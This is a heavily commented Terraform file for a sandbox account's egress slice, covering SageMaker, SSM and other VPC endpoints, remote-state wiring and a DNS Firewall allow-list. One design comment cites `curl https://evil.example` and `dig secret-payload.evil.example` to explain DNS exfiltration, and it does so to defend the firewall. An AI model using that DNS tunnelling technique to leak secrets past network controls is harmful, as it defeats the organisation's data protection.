# sandbox/egress/ - the [E] metered network of a business unit's sandbox (Stage 3 pass 3):
# the NAT under design A, the interface endpoints of step 8's Sandbox list, and step 9's
# org policy on every one of them. THE REPOSITORY'S FIRST [E] SLICE: its lifecycle belongs
# to `make up ENV=sandbox` / `make down ENV=sandbox` (D11), never to a by-hand apply
# (runbook, "What you never do") - a forgotten session costs ~USD 3.84/day and no budget
# alert exists to say so (D12); `./aws/egress.py` 6 is the burn meter that risk gets.
#
# foundation/'s [P] facts arrive through terraform_remote_state - the read its outputs.tf
# announces - never pasted (Lesson 3) and never looked up by tag: a tag lookup answers
# "what matches", remote state answers "what foundation/ BUILT", and for wiring two slices
# of one account the second question is the one being asked.

data "terraform_remote_state" "foundation" {
  backend = "s3"

  config = {
    bucket = "awsds-${var.env}-tfstate"
    key    = "${var.account_folder}/foundation/terraform.tfstate"
    region = var.region
  }
}

module "egress" {
  # checkov:skip=CKV_TF_1:pinned by git TAG by convention (conventions §6, Stage 3 step 1.1a) - a repository-internal tag only the repo owner can move
  source = "git::git@github.com:felipenoris/AWS-DataScience.git//terraform-modules/vpc-egress?ref=vpc-egress-v0.10.1"

  env    = var.env
  vpc_id = data.terraform_remote_state.foundation.outputs.vpc_id

  # Stage 3 decision 4: A is the DEFAULT, per account (10.3), not the outcome - D5's
  # comparison against B (no default route, CodeArtifact as the package path) is Stage 6's.

  # Single-AZ resources land in the FIRST authored zone (D9); the maps stay keyed by
  # zone id, so this is a selection, not an anchor on list position.
  # THE THREE ARGUMENTS THAT STOOD HERE WENT WITH THE NAT AT `vpc-egress-v0.6.0` (6c step 5.1,
  # 2026-09-06): `egress_mode`, `nat_public_subnet_id` and `private_route_table_ids`. Under D38 the
  # estate has ONE internet exit - an explicit proxy in the hub - and no VPC anywhere carries a
  # default route, so there is no design A to select and no route table for this slice to write to.
  # Nothing here needs replacing: what this slice builds now is endpoints and, where it applies, the
  # DNS Firewall.
  endpoint_subnet_id         = data.terraform_remote_state.foundation.outputs.private_subnet_ids[var.zone_ids[0]]
  endpoint_security_group_id = data.terraform_remote_state.foundation.outputs.endpoints_security_group_id

  # Step 8.3, the Sandbox row: the three SageMaker endpoints (sagemaker.studio is what lets
  # JupyterLab/Code Editor apps START in a VPC-only domain). elasticfilesystem sat here
  # until 2026-08-17, when the NFS requirement was withdrawn (D24 with it).
  #
  # `datazone` JOINED AT STAGE 6 STEP 4.2 (2026-08-21) ON A MISREAD AND LEFT ON 2026-08-25
  # (issue #39). The clause that put it here said the network-isolation page marks it
  # "REQUIRED under VpcOnly, so an app cannot reach the domain without it" - three errors in
  # one: the page's required table is scoped by its OWN premise ("access to the public
  # internet is denied from the VPC" - design B, never VpcOnly); under design A the app
  # reaches DataZone through the NAT (datazone.<region>.api.aws is on the list below); and
  # the entry was not free - its private DNS zone is AUTHORITATIVE FOR THE WHOLE SUBTREE, so
  # agent.datazone.<region>.api.aws, which the SAME page's public-internet table says the
  # portal front-end needs, was NXDOMAIN for every client of the VPC resolver, the
  # full-tunnel laptop included: the portal broke ON the VPN while this slice was up
  # (Lessons 40-42, measured 2026-08-24).
  #
  # THE RULE THIS LEAVES BEHIND OUTLIVES THE ENTRY: no endpoint whose private zone SHADOWS a
  # name the CLIENT plane requires may live in the VPC the client resolves through - and the
  # 2026-08-25 objectives clarification puts the full-tunnel laptop on this resolver BY
  # REQUIREMENT (D5 re-scoped to the compute plane). It is not a rule about `datazone`: any
  # future endpoint seizing an `api.aws` spelling inherits it. A deployment that keeps this
  # endpoint is consistent only because ITS browsers resolve somewhere else.
  #
  # UNDER DESIGN B THE ENTRY COMES BACK, and must: with no NAT there is no other path from
  # the app to DataZone. The shadowing comes back with it, so B also has to move the portal
  # off this resolver - architecture.md §4.3's second correction argues that, and it is the
  # same rule rather than an exception to it.
  #
  # PREDICTION TO MEASURE AT THE NEXT `make up`, since this is code-only - `egress/` was down
  # when it landed and nothing has been applied: the app's DataZone calls, which CloudTrail
  # showed on this endpoint on 2026-08-24, move to the NAT, and agent.datazone.<region>.api.aws
  # starts resolving for the tunnelled laptop.
  #
  # The rest of the required table (docs/SMUS.md §VpcOnly is the one copy - fifteen names) is
  # added by MEASUREMENT and not by copying: verification (viii) reads the flow logs of a
  # working session and only what is exercised gets an endpoint, at +USD 0.010/h each, per
  # account, for the whole session.
  #
  # TWO ENTRIES OF THAT TABLE CANNOT BE SETTLED BY ADDING THEM HERE, and both are recorded so
  # nobody "fixes" them:
  #   s3   this account already has a [P] GATEWAY endpoint whose prefix-list route is more
  #        specific than any default, so S3 traffic may never reach an interface endpoint at
  #        all - and the request then presents the GATEWAY's aws:SourceVpce. Which one wins,
  #        per project subnet, is verification (xix), and flow logs are the wrong instrument
  #        (gateway traffic crosses no ENI): the field is CloudTrail's vpcEndpointId.
  #   q    the doc pairs it with com.amazonaws.US-EAST-1.codewhisperer, and an interface
  #        endpoint is regional - so under design B the Amazon Q surface has no private path
  #        from us-west-2 at all. Record what breaks at 4.3 rather than assuming either way.
  # `s3tables` IS ALWAYS ON, not a flag value (user decision, 2026-09-06) - one endpoint at
  # ~USD 0.010/h against a blueprint that is ENABLED. `S3TableCatalog` is one of category 1's
  # eleven, and **the S3 GATEWAY endpoint does not cover it**: a gateway carries `s3` and
  # `dynamodb` and nothing else, while `s3tables` is its own service name in the Region's catalog
  # (measured 2026-09-06). Under design B a project using that blueprint would have no path at
  # all - the same failure 5.3 describes for Bedrock and EMR, in a blueprint nobody had named.
  # STEP 5.2's COMPLETION OF THE REQUIRED SET (2026-09-06). Under design A the NAT covered every
  # name silently; with no default route anywhere, a service without an endpoint here is a service
  # with **no path at all**. Every name below was checked against the Region's own catalog on the
  # day it was added - `describe-vpc-endpoint-services`, 569 entries - which is what this step's own
  # "measure rather than copy" asks for, and it is how `q` was struck from the step's list: **no
  # such endpoint service exists in this Region**, only `qapps` and the `quicksight*` family.
  extra_services = [
    # The SMUS surface, unchanged since Stage 3.
    "sagemaker.api",
    "sagemaker.runtime",
    "sagemaker.studio",

    # `S3TableCatalog` is one of category 1's eleven and the S3 GATEWAY endpoint does not cover it
    # (a gateway carries `s3` and `dynamodb`, nothing else). Always-on rather than behind 5.3's
    # flag, by the user's decision: one endpoint, and the blueprint is enabled.
    "s3tables",

    # BACK AFTER BEING REMOVED ON 2026-08-25, and the reason it can return is structural rather
    # than a change of mind. It was taken out because its private DNS shadowed a name the VPN
    # CLIENT had to resolve publicly - the tunnel was in this VPC then, so the client saw this
    # VPC's resolver view. **The tunnel is in VPC-Networking now, which by decision carries no
    # interface endpoint at all** (Lessons 40-43's structural repair), so a private zone here
    # cannot reach the client plane. What resolves it privately now is what should: a SageMaker
    # app in this VPC calling the portal's API.
    "datazone",

    # SESSION MANAGER'S THREE, which 5.5 requires of every instance-bearing spoke. **Session
    # Manager does not work through an HTTPS proxy listener**, so the shell that reads the proxy's
    # own log must not depend on the proxy (Lesson 24: the instrument and its subject need
    # different channels). The hub's two hosts reach SSM through the IGW instead and need none.
    "ssm",
    "ssmmessages",
    "ec2messages",

    # `ec2` for the describe calls SageMaker and EMR make on the account's own network objects,
    # and `secretsmanager` for a job reading a credential - both covered by the NAT until now.
    "ec2",
    "secretsmanager",
  ]

  # THE OPTIONAL FAMILIES, EMPTY UNLESS `make up ENV=sandbox GROUPS=...` NAMES ONE. Wired HERE
  # and in no other egress slice, deliberately: the blueprints these serve are SMUS blueprints and
  # the SMUS surface lives in this account alone - 6b removed it from Staging, and Production is a
  # deployment target. Declaring the capability where nothing can use it would be an input that
  # reads like a feature. When a Production workload asks for Bedrock, that slice gets the same
  # two lines and the module already knows the answer.
  optional_service_groups = var.optional_service_groups

  # THE FIREWALL STAYS, AND ITS JOB CHANGED (6c step 5.7, 2026-09-06). It used to be design A's
  # control: a NAT gateway carried anything, so a name that did not resolve was a host nobody
  # reached, and this list was what made "limited internet" different from "internet". Step 5.1
  # removed the last default route in the estate (D38), so nothing in this VPC can open an internet
  # connection at all except as a CLIENT OF THE PROXY - and an explicit-proxy client never resolves
  # the name it is asking for. Squid does.
  #
  # SO WHY KEEP IT. Because removing the route did not close the resolver. `curl https://evil.example`
  # cannot leave this VPC; `dig secret-payload.evil.example` would have, one label at a time,
  # through the VPC's own recursive resolver, which is not a route and was never what the route
  # removal touched. Closing that channel is the whole of this control's remaining job, and it is
  # why the list below is ten entries rather than sixty-three: names this VPC must resolve in order
  # to function, and nothing else.
  dns_firewall = true

  # KEPT AT TRUST, FOR A DIFFERENT REASON THAN IT WAS SET (rewritten 5.7). It was here because
  # package artifacts are served from shared CDNs, and under INSPECT an allow-list could carry
  # every index and still have no download path - the CNAME chain left the list. Those names are
  # Squid's now, and Squid matches the hostname the client REQUESTED, so no chain is evaluated
  # anywhere in the estate. What TRUST still buys on the list below is narrow and worth having: the
  # only names left are AWS's own namespaces and this estate's own private zones, so the chain
  # beneath an entry is pointed by AWS or by us. INSPECT would turn any AWS-internal CNAME leaving
  # `*.amazonaws.com` into a resolution failure with no owner and no remedy.
  firewall_domain_redirection_action = "TRUST_REDIRECTION_DOMAIN"

  # WHERE THE OLD LIST WENT, because "shrunk from 63 to 10" is only half the sentence. Every
  # package host, every console family, every sign-in name and the one CDN wildcard moved to the
  # proxy's SOURCE-SCOPED allow-lists in `production/networking/` (step 4.9), where they became
  # **two filters instead of one**: what a person on the tunnel may reach is no longer the same set
  # as what a notebook may reach. That split is the thing this list could never express - a VPC has
  # one resolver, and everything in it shared one answer.
  #
  # AND A `"*"` CAME OFF HERE. Commit `f6bb316` ("allow-all egress", 2026-08-23) put a single
  # wildcard at the top of this list; `*` matches every name, so the sixty-two entries beneath it
  # were decoration and the firewall was a default-ALLOW. It is named rather than quietly dropped,
  # because a list whose first entry is `*` reads as a configured control to every review that does
  # not read it to the end (Lesson 5).
  #
  # EXC-04, EXC-05 AND EXC-06 CLOSE WITH THE OLD LIST, and EXC-05's failure MODE retires outright
  # rather than moving: it needed a resolver evaluating a redirection chain and blaming the
  # original name for a hop's absence. The filter that replaced it never sees a chain.
  dns_firewall_allow_domains = [
    # EVERY ENTRY CARRIES A TRAILING DOT, AND IT IS `EXC-04`'s REPAIR RATHER THAN A STYLE
    # (2026-09-06). Route 53 Resolver canonicalises a domain list as FQDNs and returns
    # `amazonaws.com.`; written without one, the provider compared two spellings of the same list
    # and re-issued `UpdateFirewallDomains` on every apply, so `terraform plan` read
    # `0 to add, 2 to change` immediately after a successful apply of this very code - taking away
    # *"re-plan reads `No changes`"*, this repository's closing check for every change. Measured on
    # a live list before being written: dotting these entries alone took the plan from `2 to change`
    # to `1 to change`, and `vpc-egress-v0.10.0` dots the module's catch-all for the other half.
    # AWS'S OWN NAMESPACES. Every regional service endpoint lives under one of these, and they
    # cannot be enumerated - which is why they are wildcards rather than names. The apex is listed
    # beside each wildcard because a Route 53 domain-list wildcard never matches the apex itself.
    # THIS IS THE SYNTAX SQUID COLLAPSES: there, `.amazonaws.com` covers both and listing the apex
    # beside it is FATAL. Two systems, one intent, two spellings - transcribing between them is
    # Lesson 53, and they agree on every easy case.
    "amazonaws.com.", "*.amazonaws.com.",
    "api.aws.", "*.api.aws.",

    # `sagemaker.aws` IS COVERED BY NEITHER OF THE ABOVE, and omitting it is how this slice would
    # pay hourly for an endpoint nothing can resolve: `sagemaker.studio` answers on
    # `*.studio.<region>.sagemaker.aws`, a different TLD entirely. `vpc-egress-v0.8.0`'s
    # precondition is what turns that from a silent NXDOMAIN into a plan-time failure naming the
    # endpoint - written because this step is exactly the one that creates the opportunity.
    "sagemaker.aws.", "*.sagemaker.aws.",

    # THE ESTATE'S OWN PRIVATE ZONES - `proxy.awsds.internal` and `gitlab.awsds.internal` among
    # them, which is why a client can be told to use a NAME for the proxy rather than an address.
    # Listed as SIBLINGS because `awsds.internal` does not cover `awsds-pages.internal`: a
    # different label, not a subdomain. The old family (`sandbox.internal`, `prod.internal`,
    # `pages.internal`) is deliberately absent - an entry here is exactly what would keep a
    # retired zone alive past step 2.6.
    "awsds.internal.", "*.awsds.internal.",
    "awsds-pages.internal.", "*.awsds-pages.internal.",
  ]

  # THE REACH THIS LIST HAS THAT ITS NAME DOES NOT SUGGEST is still true and no longer has a
  # subject in this account: the rule group associates to the VPC ID rather than to a route
  # table, so it filters EVERY host in this VPC. It used to filter `sandbox/buildbox/` too - a
  # host whose egress left through the WireGuard NAT instance and never touched this slice at
  # all - which is how "a build must run with egress/ DOWN" became a rule. That host moved to
  # `production/buildbox/` at 6c step 5.8 and this VPC no longer has a tenant the sentence
  # applies to. Kept because the MECHANISM is the thing to remember: anything put in this VPC
  # is filtered by this list, whether or not this slice is what gives it a path.

  # DELIBERATELY ABSENT, and this is the record that makes it a control rather than an
  # oversight (Lesson 5; Stage 6 decision 3, 2026-08-19): Athena Spark's three session
  # endpoints - athena.sessions (Spark Connect), athena.dashboard (Live UI) and
  # athena.persistent-dashboard (History Server). Athena Spark runs its executors OUTSIDE
  # this VPC - there is no NetworkConfiguration in its API - so a notebook on it sits
  # outside these endpoints, the flow logs and every aws:SourceVpce condition. The
  # preventive half is the SCP deny on athena:StartSession/UpdateSession (Stage 6 step 1.6);
  # not creating these is the free network half, and it is a CHOICE since the 2026-04
  # PrivateLink release, not a property of the service.
  #
  # THE SQL PATH IS UNAFFECTED and must stay that way: Athena SQL rides the `athena` API
  # endpoint (the module's core list), which is what D13 depends on. Three names in the
  # same family, two different products.
  #
  # Revision trigger: Athena Spark gaining executors in OUR subnets under OUR security
  # group - never a headline saying it "supports VPC", which is about the control path.

}
